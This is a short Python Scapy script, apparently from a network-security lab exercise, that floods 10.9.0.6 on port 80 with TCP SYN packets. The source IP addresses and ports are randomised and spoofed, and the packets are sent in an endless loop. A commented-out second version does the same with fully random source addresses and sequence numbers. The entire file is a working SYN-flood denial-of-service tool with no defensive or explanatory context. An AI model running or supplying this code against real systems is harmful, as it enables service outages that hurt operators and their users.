from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits
import random

target_ip = "10.9.0.6"
target_port = 80

ip = IP(src=RandIP("10.9.0.0/24"), dst=target_ip)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

raw = Raw(b"AAbdullah")
p = ip/tcp/raw
while True:		
	send(p, loop=1, verbose=0)

#DEST_IP = "10.9.0.6"

#i = 1
#packet = IP(dst=DEST_IP)/TCP(dport=80, flags='S')
#while i:
 #   packet[IP].src = str(IPv4Address(getrandbits(32)))
  #  packet[TCP].sport = getrandbits(16)
   # packet[TCP].seq = getrandbits(32)
   # send(packet, iface = 'eth0', verbose = 0)
   # print("Total packets sent: %d" % i)
   # i+=1
